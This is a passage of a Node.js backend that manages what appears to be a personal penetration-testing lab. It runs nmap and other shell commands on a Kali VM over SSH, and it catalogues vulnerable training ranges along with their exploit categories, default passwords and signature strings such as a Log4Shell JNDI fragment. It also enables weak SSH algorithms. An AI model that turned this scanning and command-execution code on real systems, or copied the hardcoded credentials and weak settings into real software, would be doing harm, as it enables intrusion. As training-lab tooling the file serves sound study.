const { Client } = require('ssh2');
const fs = require('fs');
const path = require('path');

// ===== 虚拟机配置（来自用户真实靶场）=====
const KALI_CONFIG = {
  id: 'kali',
  name: 'Kali Linux（攻击机）',
  role: 'attacker',
  os: 'Kali Linux',
  icon: '🐉',
  host: process.env.KALI_HOST || '192.168.108.128',
  port: Number(process.env.KALI_PORT || 22),
  username: process.env.KALI_USER || 'kail',
  password: process.env.KALI_PASS || 'kail',
};

const WIN7_CONFIG = {
  id: 'win7',
  name: 'Windows 7（靶机）',
  role: 'target',
  os: 'Windows 7',
  icon: '🪟',
  host: process.env.WIN7_HOST || '192.168.108.129',
  // Win7 作为靶机不直接 SSH 连，通过 Kali 探测它
  directConnect: false,
  commonPorts: [135, 139, 445, 3389, 80, 21, 23, 443, 1433, 3306],
};

const MACHINES = [KALI_CONFIG, WIN7_CONFIG];

// ===== DVWA Web 靶场配置（两台 VM 上都搭了 DVWA） =====
// 兼容旧的 DVWA_TARGETS（保留给原有 API / ATTACK_MODULES 用）
const DVWA_TARGETS = [
  {
    id: 'dvwa-kali',
    name: 'DVWA · Kali Apache 版',
    builtBy: 'APT 包 + MariaDB（Apache 端口 80）',
    icon: '🐲',
    machine: 'kali',
    baseUrl: process.env.DVWA_KALI_URL || 'http://192.168.108.128/dvwa/',
    color: 'cyan',
    defaultCreds: { user: 'admin', pass: 'password' },
    setupPage: 'setup.php',
    loginPage: 'login.php',
  },
  {
    id: 'dvwa-win7',
    name: 'DVWA · Win7 phpStudy 版',
    builtBy: 'phpStudy 搭建（PHP + Apache/MySQL）',
    icon: '🪟',
    machine: 'win7',
    baseUrl: process.env.DVWA_WIN7_URL || 'http://192.168.108.129/dvwa/',
    color: 'amber',
    defaultCreds: { user: 'admin', pass: 'password' },
    setupPage: 'setup.php',
    loginPage: 'login.php',
  },
];

// ===== 通用 Web 靶场总表（22 个靶场 · day085~day106 + Vulhub平台）=====
// category: web-general(Web通用漏洞) / windows-priv(Windows提权) / intranet-domain(内网域环境)
//           middleware(中间件漏洞) / cms(CMS漏洞) / java-deserialize(Java反序列化) / enterprise(企业级综合)
// status: ready(已搭建可访问) / planned(待搭建) / unavailable(暂不可用/多VM/ISO独立)
const WEB_TARGETS = [
  // ==================== status = ready（9 个已就绪）====================
  // day085 · 靶场1
  {
    id: 'dvwa',
    name: 'DVWA',
    dayNo: 'day085',
    builtBy: 'APT 包 + MariaDB（Apache 80 端口）',
    icon: '🎯',
    machine: 'kali',
    baseUrl: process.env.DVWA_URL || 'http://192.168.108.128/dvwa/',
    color: 'cyan',
    category: 'web-general',
    categoryLabel: 'Web通用漏洞练习',
    defaultCreds: { user: 'admin', pass: 'password' },
    credentials: 'admin / password',
    loginPage: 'login.php',
    setupPage: 'setup.php',
    checkPath: 'login.php',
    signatures: ['DVWA', 'Damn Vulnerable', 'dvwa_page', 'username'],
    description: '经典 Damn Vulnerable Web Application，覆盖 SQLi/XSS/CSRF/命令注入/文件包含/上传等所有常见 Web 漏洞类型，入门必练。',
    vulnerabilities: ['SQL注入', 'XSS跨站脚本', 'CSRF', '命令注入', '文件包含', '文件上传', '暴力破解', '弱会话ID'],
    status: 'ready',
    notes: 'day085 已就绪',
  },
  // day087 · 靶场3
  {
    id: 'xss-challenges',
    name: 'XSS-Challenges · XSS专项',
    dayNo: 'day087',
    builtBy: 'GitHub 源码部署 /xss 路径',
    icon: '💉',
    machine: 'kali',
    baseUrl: process.env.XSS_URL || 'http://192.168.108.128/xss/',
    color: 'rose',
    category: 'web-general',
    categoryLabel: 'Web通用漏洞练习',
    defaultCreds: null,
    credentials: '无需登录',
    checkPath: 'index.php',
    signatures: ['XSS Challenges', 'prompt(', 'alert(', 'xss'],
    description: '专注 XSS 跨站脚本的专项靶场，覆盖反射型、存储型、DOM 型、CSP 绕过、JSfuck、Unicode 绕过等多场景 XSS 挑战。',
    vulnerabilities: ['反射型XSS', '存储型XSS', 'DOM型XSS', 'CSP绕过', '编码绕过', 'Flash XSS'],
    status: 'ready',
    notes: 'day087 已就绪 /xss 路径',
  },
  // day089 · 靶场5
  {
    id: 'upload-labs',
    name: 'Upload-Labs · 文件上传专项',
    dayNo: 'day089',
    builtBy: 'PHP 环境独立部署（端口 8084）',
    icon: '📤',
    machine: 'kali',
    baseUrl: process.env.UPLOAD_URL || 'http://192.168.108.128:8084/',
    color: 'teal',
    category: 'web-general',
    categoryLabel: 'Web通用漏洞练习',
    defaultCreds: { user: 'admin', pass: 'admin' },
    credentials: 'admin / admin',
    checkPath: 'index.php',
    signatures: ['upload-labs', 'Pass-', '上传关卡'],
    description: '专注文件上传漏洞的靶场，共 21 关，系统覆盖前端 JS 校验、MIME 类型绕过、后缀黑名单绕过、%00 截断、.htaccess、解析漏洞等全部上传技巧。',
    vulnerabilities: ['前端JS绕过', 'MIME绕过', '后缀黑名单绕过', '%00截断', '.user.ini', '.htaccess', 'Apache解析漏洞', 'IIS解析漏洞'],
    status: 'ready',
    notes: 'day089 已就绪 端口 :8084',
  },
  // day090 · 靶场6
  {
    id: 'bwapp',
    name: 'bWAPP · 漏洞Web应用',
    dayNo: 'day090',
    builtBy: 'PHP + MySQL 部署 /bwapp 路径',
    icon: '🐝',
    machine: 'kali',
    baseUrl: process.env.BWAPP_URL || 'http://192.168.108.128/bwapp/login.php',
    color: 'amber',
    category: 'web-general',
    categoryLabel: 'Web通用漏洞练习',
    defaultCreds: { user: 'bee', pass: 'bug' },
    credentials: 'bee / bug（安装页面 admin / 12345678）',
    loginPage: 'login.php',
    installPage: 'install.php',
    checkPath: 'login.php',
    signatures: ['bWAPP', 'bee-box', 'buggy web application', 'portal.php'],
    description: 'bWAPP (buggy web application) 含 100+ 漏洞练习点，覆盖 OWASP Top 10、HTML5、XML、Heartbleed、SSL 等，是综合漏洞训练平台。',
    vulnerabilities: ['SQLi', 'XSS', 'XXE', 'SSRF', 'CSRF', '点击劫持', 'Heartbleed', 'Shellshock', '上传', '包含'],
    status: 'ready',
    notes: 'day090 已就绪 /bwapp/login.php',
  },
  // day092 · 靶场8
  {
    id: 'tomcat',
    name: 'Tomcat PUT RCE · CVE-2017-12615',
    dayNo: 'day092',
    builtBy: '独立 Tomcat 实例（端口 8080）',
    icon: '🐈',
    machine: 'kali',
    baseUrl: process.env.TOMCAT_URL || 'http://192.168.108.128:8080/',
    color: 'emerald',
    category: 'middleware',
    categoryLabel: '中间件漏洞',
    defaultCreds: { user: 'tomcat', pass: 'tomcat' },
    credentials: 'tomcat / tomcat（manager后台）',
    managerPage: 'manager/html',
    checkPath: '',
    signatures: ['Apache Tomcat', 'Tomcat/7', 'Tomcat/8', 'Manager App'],
    description: 'Tomcat 任意文件写入导致 RCE（CVE-2017-12615），配合弱口令 manager 后台部署 WAR 包拿 Shell，Java 中间件经典入门漏洞。',
    vulnerabilities: ['CVE-2017-12615 PUT上传', 'Manager弱口令', 'WAR包部署RCE'],
    status: 'ready',
    notes: 'day092 已就绪 端口 :8080',
  },
  // day093 · 靶场9
  {
    id: 'struts2',
    name: 'Struts2 S2-045 OGNL RCE',
    dayNo: 'day093',
    builtBy: '独立 Docker/Java 容器（端口 8082）',
    icon: '🏗️',
    machine: 'kali',
    baseUrl: process.env.STRUTS2_URL || 'http://192.168.108.128:8082/',
    color: 'orange',
    category: 'java-deserialize',
    categoryLabel: 'Java反序列化',
    checkPath: '',
    signatures: ['Struts', 'Apache Struts', 'struts2', 'showcase'],
    description: 'S2-045（CVE-2017-5638）基于 Content-Type 头的 OGNL 表达式注入 RCE，Java 漏洞利用必知必会经典 Payload。',
    vulnerabilities: ['S2-045 OGNL RCE', 'S2-016 命令执行', 'S2-007 类型转换注入', 'DevMode RCE'],
    status: 'ready',
    notes: 'day093 已就绪 端口 :8082',
  },
  // day096 · 靶场12
  {
    id: 'thinkphp',
    name: 'ThinkPHP 5.x RCE 靶场',
    dayNo: 'day096',
    builtBy: '独立 PHP 实例（端口 8081）',
    icon: '🧠',
    machine: 'kali',
    baseUrl: process.env.TP5_URL || 'http://192.168.108.128:8081/',
    color: 'violet',
    category: 'cms',
    categoryLabel: 'CMS漏洞',
    checkPath: 'index.php',
    signatures: ['ThinkPHP', 'TinkPHP', 'thinkphp5', '页面错误'],
    description: 'ThinkPHP 5.0.x/5.1.x 系列 RCE 漏洞，覆盖 method=__construct 变量覆盖、s=index/think\\app/invokefunction 等经典利用链。',
    vulnerabilities: ['ThinkPHP 5 RCE', '变量覆盖RCE', 'invokefunction RCE', 'Session反序列化'],
    status: 'ready',
    notes: 'day096 已就绪 端口 :8081',
  },
  // day098 · 靶场13（WebGoat + WebWolf）
  {
    id: 'webgoat',
    name: 'WebGoat · Java安全教学靶场 (+WebWolf)',
    dayNo: 'day098',
    builtBy: 'SpringBoot 独立 JAR 部署（WebGoat 8083 / WebWolf 9091）',
    icon: '🐐',
    machine: 'kali',
    baseUrl: process.env.WEBGOAT_URL || 'http://192.168.108.128:8083/WebGoat',
    color: 'lime',
    category: 'web-general',
    categoryLabel: 'Web通用漏洞练习',
    defaultCreds: { user: 'guest', pass: 'guest' },
    credentials: 'guest / guest（可自注册）· WebWolf: http://192.168.108.128:9091/WebWolf',
    loginPage: 'login',
    checkPath: 'login',
    signatures: ['Login Page', 'WebGoat', 'OWASP', 'Lesson', 'Sign in'],
    description: 'OWASP WebGoat 是著名 Java Web 安全教学平台，覆盖认证绕过、JWT、SQLi、XXE、路径遍历、反序列化等 40+ 章节；配套 WebWolf 用于接收外带数据。',
    vulnerabilities: ['SQLi(高级)', 'JWT攻击', 'XXE', 'SSRF', '反序列化', '认证绕过', '路径遍历', 'Open Redirect'],
    status: 'ready',
    notes: 'day098 已就绪 WebGoat :8083/WebGoat · WebWolf :9091/WebWolf',
  },
  // dayXXX · 靶场13+ · Vulhub 平台
  {
    id: 'vulhub-platform',
    name: 'Vulhub平台 · 200+ 容器化漏洞环境',
    dayNo: 'dayXXX',
    builtBy: 'Docker Compose 编排 / Vulhub 官方仓库（4 容器已运行）',
    icon: '📦',
    machine: 'kali',
    baseUrl: process.env.VULHUB_URL || 'http://192.168.108.128:8000/',
    color: 'fuchsia',
    category: 'enterprise',
    categoryLabel: '企业级综合靶场',
    defaultCreds: null,
    credentials: '不同环境独立账号（详见各环境文档）',
    checkPath: '',
    signatures: ['vulhub', 'docker', 'vulnerable environment'],
    description: 'Vulhub 开源漏洞靶场平台，覆盖 200+ 真实 CVE 环境，含 Fastjson/Shiro/Log4j2/ThinkPHP/WebLogic/Nginx/Spring 等一键 docker-compose 启动。当前已运行 4 个容器。',
    vulnerabilities: ['Fastjson系列', 'Shiro系列', 'Log4j2系列', 'ThinkPHP系列', 'WebLogic系列', 'Nginx解析漏洞', 'Spring系列', 'CMS漏洞全集'],
    status: 'ready',
    notes: 'dayXXX 已就绪 · 靶场平台 · 200+ 环境 · 当前 4 容器运行中',
  },

  // ==================== status = planned（7 个待搭建）====================
  // day086 · 靶场2
  {
    id: 'sqli-labs',
    name: 'SQLi-Labs · 注入专项',
    dayNo: 'day086',
    builtBy: 'GitHub 源码部署 /sqli-labs 路径',
    icon: '🗃️',
    machine: 'kali',
    baseUrl: process.env.SQLI_LABS_URL || 'http://192.168.108.128/sqli-labs/',
    color: 'indigo',
    category: 'web-general',
    categoryLabel: 'Web通用漏洞练习',
    defaultCreds: { user: 'root', pass: 'root' },
    credentials: 'root / root（DB 连接）',
    setupPage: 'sql-connections/db-creds.inc',
    checkPath: 'index.html',
    signatures: ['SQLi-LABS', 'SQL Injections', 'Setup/reset Database for labs'],
    description: '专注 SQL 注入的经典靶场，70+ 关卡，覆盖 GET/POST/Cookie/Header 注入、盲注、报错注入、堆叠注入、二次注入等全部场景。',
    vulnerabilities: ['GET注入', 'POST注入', 'Cookie注入', 'Header注入', '布尔盲注', '时间盲注', '报错注入', '堆叠注入', '二次注入', 'WAF绕过'],
    status: 'ready',
    notes: 'day086 已就绪 · 77 Less · 数据库 leet/leet123 security+challenges',
  },
  // day088 · 靶场4
  {
    id: 'pikachu',
    name: 'Pikachu · 皮卡丘中文靶场',
    dayNo: 'day088',
    builtBy: 'GitHub 源码部署 PHP + MariaDB /pikachu 路径',
    icon: '⚡',
    machine: 'kali',
    baseUrl: process.env.PIKACHU_URL || 'http://192.168.108.128/pikachu/',
    color: 'rose',
    category: 'web-general',
    categoryLabel: 'Web通用漏洞练习',
    defaultCreds: { user: 'admin', pass: '123456' },
    credentials: 'admin / 123456',
    loginPage: 'index.php',
    installPage: 'install.php',
    checkPath: 'index.php',
    signatures: ['pikachu', 'Get the pikachu', 'assets/css/bootstrap.min.css'],
    description: '国内知名中文 Web 安全练习靶场，含 12 大模块，对 SSRF、XXE、反序列化、PHP 反序列化、逻辑漏洞覆盖全面，讲解深入浅出。',
    vulnerabilities: ['SQL注入', 'XSS', 'CSRF', 'SSRF', 'XXE', '文件上传', '文件包含', '反序列化', '逻辑漏洞', '越权访问'],
    status: 'ready',
    notes: 'day088 已就绪 · admin/123456 · DB leet/leet123 库 pikachu',
  },
  // day100 · 靶场15
  {
    id: 'fastjson',
    name: 'Fastjson 反序列化 RCE 合集',
    dayNo: 'day100',
    builtBy: 'Vulhub Docker 编排 多版本 Fastjson 镜像',
    icon: '⚡',
    machine: 'kali',
    baseUrl: process.env.FASTJSON_URL || 'http://192.168.108.128:8090/',
    color: 'lime',
    category: 'java-deserialize',
    categoryLabel: 'Java反序列化',
    defaultCreds: null,
    credentials: '无需登录（接口靶场）',
    checkPath: '',
    signatures: ['fastjson', 'autoType', 'setAccessible', 'JNDI'],
    description: 'Fastjson 1.2.x 反序列化 RCE 合集，覆盖 JNDI 注入（JdbcRowSetImpl、TemplatesImpl）、AutoType 绕过、BCEL ClassLoader 等多版本利用链。',
    vulnerabilities: ['Fastjson 1.2.24 JNDI', 'Fastjson 1.2.47 AutoType', 'Fastjson 1.2.68 绕过', 'BCEL ClassLoader'],
    status: 'planned',
    notes: 'day100 planned · Vulhub Docker 编排',
  },
  // day101 · 靶场16
  {
    id: 'log4j2',
    name: 'Log4j2 JNDI RCE · Log4Shell',
    dayNo: 'day101',
    builtBy: 'Vulhub Docker 镜像 spring-boot-struts2 / solr 等',
    icon: '🌲',
    machine: 'kali',
    baseUrl: process.env.LOG4J2_URL || 'http://192.168.108.128:8983/',
    color: 'sky',
    category: 'java-deserialize',
    categoryLabel: 'Java反序列化',
    defaultCreds: null,
    credentials: '不同环境不同（Solr 无需登录）',
    checkPath: '',
    signatures: ['log4j2', '${jndi:', 'Log4Shell', 'solr'],
    description: 'CVE-2021-44228 Log4Shell，近年影响最广的 RCE。覆盖 ${jndi:ldap://} 基础利用、WAF 绕过、高版本 JDK trustURLCodebase 限制绕过等。',
    vulnerabilities: ['Log4Shell CVE-2021-44228', 'CVE-2021-45046 绕过', 'DNSLOG外带', 'RMI/JRMP 替代协议'],
    status: 'planned',
    notes: 'day101 planned · Vulhub Docker 运行',
  },
  // day102 · 靶场17
  {
    id: 'shiro',
    name: 'Shiro RememberMe 反序列化 RCE',
    dayNo: 'day102',
    builtBy: 'Vulhub Docker 镜像 shiro 1.2.4 / 1.4.1 多版本',
    icon: '🔒',
    machine: 'kali',
    baseUrl: process.env.SHIRO_URL || 'http://192.168.108.128:8080/',
    color: 'slate',
    category: 'java-deserialize',
    categoryLabel: 'Java反序列化',
    loginPage: 'login',
    defaultCreds: { user: 'root', pass: '123456' },
    credentials: 'root / 123456',
    checkPath: 'login',
    signatures: ['Shiro', 'rememberMe', '=deleteMe'],
    description: 'Apache Shiro 默认密钥 Shiro-550 / Shiro-721，硬编码 AES Key 导致反序列化 RCE，蓝队流量特征明显（rememberMe=xxx Cookie）。',
    vulnerabilities: ['Shiro-550 默认密钥', 'Shiro-721 Padding Oracle', 'CC/CommonsBeanutils 利用链'],
    status: 'planned',
    notes: 'day102 planned · Vulhub Docker 镜像',
  },
  // day103 · 靶场18
  {
    id: 'nginx',
    name: 'Nginx 解析漏洞/配置缺陷靶场',
    dayNo: 'day103',
    builtBy: 'Vulhub Docker 多版本 Nginx 镜像 (解析/CRLF/目录穿越)',
    icon: '🚀',
    machine: 'kali',
    baseUrl: process.env.NGINX_URL || 'http://192.168.108.128:8080/',
    color: 'emerald',
    category: 'middleware',
    categoryLabel: '中间件漏洞',
    defaultCreds: null,
    credentials: '无需登录',
    checkPath: '',
    signatures: ['nginx', '403 Forbidden', 'Welcome to nginx'],
    description: 'Nginx 中间件配置缺陷靶场，覆盖 CVE-2013-4547 文件名逻辑漏洞、Nginx 解析漏洞 (file.php/a.jpg)、CRLF 注入、目录穿越、反序列化等多场景。',
    vulnerabilities: ['Nginx 解析漏洞', 'CVE-2013-4547', 'CRLF注入', '目录穿越', '配置错误', 'SSRF'],
    status: 'planned',
    notes: 'day103 planned · Vulhub Docker 多镜像',
  },
  // day104 · 靶场19
  {
    id: 'websphere',
    name: 'WebSphere · CVE 经典漏洞靶场',
    dayNo: 'day104',
    builtBy: 'Docker 镜像部署 WebSphere Application Server（多 CVE）',
    icon: '⚙️',
    machine: 'kali',
    baseUrl: process.env.WEBSPHERE_URL || 'http://192.168.108.128:9060/ibm/console',
    color: 'violet',
    category: 'middleware',
    categoryLabel: '中间件漏洞',
    defaultCreds: null,
    credentials: '控制台 admin / 特定密码（按镜像文档）',
    consolePage: 'ibm/console',
    checkPath: 'ibm/console',
    signatures: ['WebSphere', 'IBM WebSphere', 'ibm/console', 'AdminConsole'],
    description: 'IBM WebSphere Application Server 经典 CVE 靶场，覆盖 CVE-2020-4450 / CVE-2021-2109 / CVE-2016-6193 等多个 Java 反序列化/管理控制台 RCE。',
    vulnerabilities: ['CVE-2020-4450', 'CVE-2021-2109', 'CVE-2016-6193', '控制台弱口令', 'Java反序列化'],
    status: 'planned',
    notes: 'day104 planned · CVE 靶场 · Docker 部署',
  },

  // ==================== status = unavailable（6 个暂不可用/多VM/ISO独立）====================
  // day091 · 靶场7
  {
    id: 'ithema-labs',
    name: 'IThema-Labs · 合天智汇（Win2008独立VM）',
    dayNo: 'day091',
    builtBy: 'Win2008 独立虚拟机 · 不可直接从 Kali 网段访问',
    icon: '🏛️',
    machine: 'standalone-vm',
    baseUrl: '',
    color: 'amber',
    category: 'windows-priv',
    categoryLabel: 'Windows提权',
    defaultCreds: null,
    credentials: 'Win2008独立登录（启动后查快照文档）',
    checkPath: '',
    signatures: [],
    description: '合天智汇 IThema-Labs Windows 靶场，独立 Win2008 VM，含 Windows 各种提权场景（内核漏洞/SID History/SMB Relay 等），需使用 VMware 独立启动。',
    vulnerabilities: ['Windows内核提权', 'Bypass UAC', 'SID History滥用', 'SMB Relay', '令牌窃取', '服务路径劫持'],
    status: 'unavailable',
    notes: 'day091 unavailable · Win2008 独立VM · 需单独启动',
  },
  // day094 · 靶场10
  {
    id: 'webbug',
    name: 'WebBug · 综合Web靶场',
    dayNo: 'day094',
    builtBy: '独立VM部署 · 非 Kali 网段可访问',
    icon: '🪲',
    machine: 'standalone-vm',
    baseUrl: '',
    color: 'rose',
    category: 'web-general',
    categoryLabel: 'Web通用漏洞练习',
    defaultCreds: null,
    credentials: '参考靶场发布文档',
    checkPath: '',
    signatures: [],
    description: 'WebBug 国产综合 Web 漏洞靶场，覆盖 SQLi/XSS/上传/包含/反序列化/逻辑漏洞等多场景，需要独立 VM 运行。',
    vulnerabilities: ['SQLi注入', 'XSS', '文件上传', '文件包含', '反序列化', '逻辑漏洞', '越权'],
    status: 'unavailable',
    notes: 'day094 unavailable · 独立VM · 非 Kali 网段',
  },
  // day095 · 靶场11
  {
    id: 'vulstack',
    name: 'VulStack · 红队评估内网多VM靶场',
    dayNo: 'day095',
    builtBy: '多 VM 内网编排（域控 + Web + DB 多台）· 非单机可部署',
    icon: '🔺',
    machine: 'multi-vm-intranet',
    baseUrl: '',
    color: 'indigo',
    category: 'intranet-domain',
    categoryLabel: '内网域环境',
    defaultCreds: null,
    credentials: '多机独立账号（需按靶场手册获取初始 WebShell）',
    checkPath: '',
    signatures: [],
    description: 'VulStack 系列红队评估靶场，由多 VM 组合的真实内网环境，含域控、Web 入口、MySQL/MSSQL 数据库、横向移动、权限维持等完整 ATT&CK 场景。',
    vulnerabilities: ['Webshell上传', '内网代理', '哈希传递PtH', '票据传递PtT', '域控提权', '横向SMB/WMI', '权限维持'],
    status: 'unavailable',
    notes: 'day095 unavailable · 多VM内网编排 · 资源占用大',
  },
  // day099 · 靶场14
  {
    id: 'webforpentester',
    name: 'WebForPentester · PentesterLab ISO靶场',
    dayNo: 'day099',
    builtBy: 'PentesterLab 官方 ISO · 需 VMware 挂载启动独立 IP',
    icon: '💽',
    machine: 'vmware-iso',
    baseUrl: '',
    color: 'teal',
    category: 'web-general',
    categoryLabel: 'Web通用漏洞练习',
    defaultCreds: null,
    credentials: '无（HTTP 无鉴权 · ISO 启动后发现 IP）',
    checkPath: '',
    signatures: ['PentesterLab', 'Web for Pentester'],
    description: 'PentesterLab Web For Pentester 系列 ISO 靶场，是 OSCP/OSWE 备考经典资源。分 I/II/III 三个版本，覆盖基础 Web 到高级漏洞利用链条。',
    vulnerabilities: ['基础SQLi/XSS', '高级SQLi(盲/报错)', 'LDAP注入', 'XPath注入', '代码注入', '命令注入', '文件包含', '逻辑漏洞'],
    status: 'unavailable',
    notes: 'day099 unavailable · ISO 镜像需独立 VMware 挂载',
  },
  // day105 · 靶场20
  {
    id: 'redsun-domain',
    name: '红日域环境 · 红日攻防内网靶场',
    dayNo: 'day105',
    builtBy: '多 VM 域环境编排（DC + Exchange + Web + 文件服务器）· 多网段',
    icon: '🌅',
    machine: 'multi-vm-domain',
    baseUrl: '',
    color: 'red',
    category: 'intranet-domain',
    categoryLabel: '内网域环境',
    defaultCreds: null,
    credentials: '多机域账号 / 本地账号（需初始 WebShell 后内网枚举）',
    checkPath: '',
    signatures: [],
    description: '红日安全出品的综合域内网攻防靶场，含 AD 域控、Exchange、OWA、CMS Web、共享服务器等多角色，覆盖域渗透全流程（委派/SPN/约束委派/零登录等）。',
    vulnerabilities: ['AD域枚举', 'Kerberoast', '委派攻击', 'DCSync', 'PTH/PTT/PTK', 'Exchange漏洞', 'ZeroLogon/NoPac/PetitPotam'],
    status: 'unavailable',
    notes: 'day105 unavailable · 多VM域控环境 · 需≥32G内存',
  },
  // day106 · 靶场21
  {
    id: 'enterprise-range',
    name: '企业级靶场搭建 · 多OS多网段综合靶场',
    dayNo: 'day106',
    builtBy: '规划中 · 将整合 Linux / Windows / 网络设备 / 安全设备 多网段',
    icon: '🏢',
    machine: 'multi-segment',
    baseUrl: '',
    color: 'violet',
    category: 'enterprise',
    categoryLabel: '企业级综合靶场',
    defaultCreds: null,
    credentials: '规划中 · 将提供多角色初始账号（DMZ/Web/DB/AD区）',
    checkPath: '',
    signatures: [],
    description: '企业级综合靶场（规划阶段），包含 DMZ 区、办公区、管理区、核心区多网段，部署 Linux/Windows/SecurityOnion/WAF/IDS/防火墙 等多角色，模拟真实企业攻防对抗。',
    vulnerabilities: ['DMZ边界突破', '内网横向', 'WAF/IDS绕过', '流量分析', '钓鱼/社工', '权限维持', '蓝队溯源反制'],
    status: 'unavailable',
    notes: 'day106 unavailable · 规划中 · 多OS多网段 · 需要高资源宿主机',
  },
];

// 分类汇总（前端用于展示总览）—— 7 大分类
const WEB_TARGET_CATEGORIES = [
  { key: 'web-general', label: 'Web通用漏洞练习', icon: '🌐', color: 'indigo' },
  { key: 'windows-priv', label: 'Windows提权', icon: '🪟', color: 'amber' },
  { key: 'intranet-domain', label: '内网域环境', icon: '🏰', color: 'rose' },
  { key: 'middleware', label: '中间件漏洞', icon: '🧱', color: 'emerald' },
  { key: 'cms', label: 'CMS漏洞', icon: '📰', color: 'fuchsia' },
  { key: 'java-deserialize', label: 'Java反序列化', icon: '☕', color: 'orange' },
  { key: 'enterprise', label: '企业级综合靶场', icon: '🏢', color: 'violet' },
];

// ===== SSH 连接复用池 =====
const sshPool = new Map(); // machineId -> ssh2 Client

function getSshClient(machineId) {
  return sshPool.get(machineId) || null;
}

function closeSshClient(machineId) {
  const client = sshPool.get(machineId);
  if (client) {
    try { client.end(); } catch (_) {}
    sshPool.delete(machineId);
  }
}

function closeAllSsh() {
  for (const id of sshPool.keys()) closeSshClient(id);
}

// 建立/复用 SSH 连接到 Kali
function connectKali() {
  return new Promise((resolve, reject) => {
    let client = sshPool.get('kali');
    if (client && client._ready) return resolve(client);

    if (client) {
      try { client.end(); } catch (_) {}
    }

    client = new Client();
    let settled = false;

    client
      .on('ready', () => {
        if (settled) return;
        settled = true;
        client._ready = true;
        client._connectedAt = Date.now();
        sshPool.set('kali', client);
        resolve(client);
      })
      .on('error', (err) => {
        if (settled) return;
        settled = true;
        sshPool.delete('kali');
        reject(err);
      })
      .on('timeout', () => {
        if (settled) return;
        settled = true;
        sshPool.delete('kali');
        reject(new Error('连接 Kali SSH 超时'));
      })
      .on('close', () => {
        client._ready = false;
        sshPool.delete('kali');
      })
      .connect({
        host: KALI_CONFIG.host,
        port: KALI_CONFIG.port,
        username: KALI_CONFIG.username,
        password: KALI_CONFIG.password,
        readyTimeout: 8000,
        algorithms: {
          serverHostKey: ['ssh-rsa', 'ssh-dss', 'ecdsa-sha2-nistp256', 'ecdsa-sha2-nistp384', 'ecdsa-sha2-nistp521', 'ssh-ed25519', 'rsa-sha2-512', 'rsa-sha2-256'],
          kex: ['curve25519-sha256', 'curve25519-sha256@libssh.org', 'ecdh-sha2-nistp256', 'ecdh-sha2-nistp384', 'ecdh-sha2-nistp521', 'diffie-hellman-group14-sha256', 'diffie-hellman-group14-sha1', 'diffie-hellman-group-exchange-sha256', 'diffie-hellman-group-exchange-sha1'],
        },
      });
  });
}

// 在 Kali 上执行一条 shell 命令，返回 stdout/stderr/exitCode
// 设置超时防止 nmap -p- 这种长时间命令卡死
async function execOnKali(command, timeout = 60_000) {
  const client = await connectKali();
  return new Promise((resolve, reject) => {
    const timer = setTimeout(() => {
      reject(new Error(`命令执行超时 (>${timeout / 1000}s)：${command.slice(0, 80)}`));
    }, timeout);

    client.exec(command, { pty: true, env: { TERM: 'xterm', LANG: 'en_US.UTF-8', PATH: '/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin' } }, (err, stream) => {
      if (err) {
        clearTimeout(timer);
        closeSshClient('kali');
        return reject(err);
      }

      let stdout = '';
      let stderr = '';

      stream
        .on('close', (code) => {
          clearTimeout(timer);
          resolve({
            command,
            stdout: stdout.slice(0, 500_000),
            stderr: stderr.slice(0, 200_000),
            exitCode: code ?? 0,
          });
        })
        .on('data', (d) => { stdout += d.toString('utf8'); })
        .stderr.on('data', (d) => { stderr += d.toString('utf8'); });
    });
  });
}

// 检查 Kali 的在线状态（快速 SSH 握手）
async function checkKaliOnline() {
  const start = Date.now();
  try {
    await connectKali();
    const whoami = await execOnKali('whoami; hostname; uname -a; ip -4 addr show scope global', 5000);
    return {
      online: true,
      latencyMs: Date.now() - start,
      info: `${whoami.stdout.split('\n').filter(Boolean).slice(0, 3).join(' | ')}`.slice(0, 300),
      connectedSince: sshPool.get('kali')?._connectedAt || null,
      error: null,
    };
  } catch (e) {
    closeSshClient('kali');
    return {
      online: false,
      latencyMs: Date.now() - start,
      info: null,
      connectedSince: null,
      error: e.message,
    };
  }
}

// 检查 Win7 的在线状态 —— 从 Kali ping + 快速端口探测
async function checkWin7Online() {
  const start = Date.now();
  try {
    // 先 ping，再做一个快速端口扫（top-ports 100）
    const cmd = `set +e; ping -c 2 -W 2 ${WIN7_CONFIG.host}; echo "---NMAP---"; nmap -Pn -n --top-ports 100 --open -T4 ${WIN7_CONFIG.host} 2>&1 | head -80`;
    const res = await execOnKali(cmd, 15_000);
    const [pingPart, nmapPart] = res.stdout.split('---NMAP---');
    const pingOk = /[12] packets received/.test(pingPart) || /ttl=/i.test(pingPart);
    const openPorts = [];
    if (nmapPart) {
      const lines = nmapPart.split('\n');
      for (const line of lines) {
        const m = line.match(/^\s*(\d+)\/(tcp|udp)\s+open\s+(\S+)?(.*)$/i);
        if (m) {
          openPorts.push({
            port: Number(m[1]),
            protocol: m[2].toLowerCase(),
            service: m[3] || 'unknown',
            extra: (m[4] || '').trim(),
          });
        }
      }
    }
    return {
      online: pingOk || openPorts.length > 0,
      latencyMs: Date.now() - start,
      pingOk,
      openPorts,
      nmapSnippet: (nmapPart || '').slice(0, 3000).trim(),
      error: null,
    };
  } catch (e) {
    return {
      online: false,
      latencyMs: Date.now() - start,
      pingOk: false,
      openPorts: [],
      nmapSnippet: '',
      error: e.message,
    };
  }
}

// 获取所有机器的状态
async function getAllStatuses() {
  const [kali, win7, dvwaList, webTargetData] = await Promise.all([
    checkKaliOnline(),
    checkWin7Online(),
    Promise.all(DVWA_TARGETS.map((d) => checkDvwaOnline(d))),
    getAllWebTargetsStatuses({ includePlanned: true }),
  ]);
  return {
    generatedAt: new Date().toISOString(),
    machines: [
      { ...KALI_CONFIG, ...kali },
      { ...WIN7_CONFIG, ...win7 },
    ],
    dvwaTargets: dvwaList,
    // 新：通用 Web 靶场数据
    webTargets: webTargetData.targets,
    readyTargets: webTargetData.readyTargets,
    plannedTargets: webTargetData.plannedTargets,
    webCategories: webTargetData.categories,
    webByCategory: webTargetData.byCategory,
    webStats: {
      totalCount: webTargetData.totalCount,
      readyCount: webTargetData.readyCount,
      plannedCount: webTargetData.plannedCount,
      onlineCount: webTargetData.onlineCount,
    },
    targetIp: WIN7_CONFIG.host,
    attackerIp: KALI_CONFIG.host,
  };
}

// ===== DVWA 靶场状态检查 =====
// 通过 curl 从 Kali 发起 HTTP HEAD/GET 请求，验证 DVWA 是否正常响应
async function checkDvwaOnline(dvwa) {
  const start = Date.now();
